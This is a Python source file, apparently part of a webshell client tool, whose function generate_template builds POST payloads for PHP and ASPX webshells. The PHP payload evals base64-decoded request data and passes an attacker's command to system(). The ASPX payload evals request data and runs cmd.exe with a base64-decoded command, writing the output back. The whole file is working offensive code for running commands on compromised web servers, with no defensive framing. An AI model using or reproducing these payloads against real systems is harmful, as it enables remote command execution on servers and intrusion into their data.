"""
" This file is every languages' payloads
" Now it only has php and aspx
" Because I dont have asp webshell and jsp webshell is really complex
"""

def generate_template(pwd, lang):   
    if lang == "php":
        """
        ** php shell payload **
        
        ck = @eval(base64_decode($_POST[a0]));
        
        a0 = @ini_set("display_errors","0");
             @set_time_limit(0);
             @set_magic_quotes_runtime(0);echo("->|");
             ;
             $s=base64_decode($_POST["a1"]);
             @system($s);
             die();
        
        a1 = whoami
        """         
        return {
            pwd: "@eval(base64_decode($_POST[a0]));",
            "a0": '@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);;{}'
        }
    
    elif lang == "aspx":
        """
        ** aspx shell payload **
        
        ck = eval(Request.Item["a0"],"unsafe");
        a0 = Response.Write("->|");
             var err:Exception;
             try{
                var c="cmd";
                var e=new System.Diagnostics.Process();
                var out:System.IO.StreamReader,EI:System.IO.StreamReader;
                c.UseShellExecute=false;
                c.RedirectStandardOutput=true;
                c.RedirectStandardError=true;
                e.StartInfo=c;
                c.Arguments="/c "+System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item["a1"]));
                e.Start();
                out=e.StandardOutput;
                EI=e.StandardError;
                e.Close();
                Response.Write(out.ReadToEnd()+EI.ReadToEnd());
             }catch(err){
                 Response.Write("ERROR:// "+err.message);
             }
             Response.End();
        a1 = whoami
        """        
        return {
            pwd: 'eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item["a0"])),"unsafe");',
            "a0": 'var err:Exception;try{var c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding(65001).'
                  'GetString(System.Convert.FromBase64String("Y21k")));'
                  'var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;'
                  'c.UseShellExecute=false;'
                  'c.RedirectStandardOutput=true;'
                  'c.RedirectStandardError=true;'
                  'e.StartInfo=c;'
                  'c.Arguments="/c cd %s%s%s"+System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item["a1"]));'
                  'e.Start();'
                  'out=e.StandardOutput;'
                  'EI=e.StandardError;'
                  'e.Close();'
                  'Response.Write(out.ReadToEnd()+EI.ReadToEnd());'
                  '}catch(err){'
                  'Response.Write("ERROR:// "+err.message);'
                  '}'
                  'Response.End();'
        }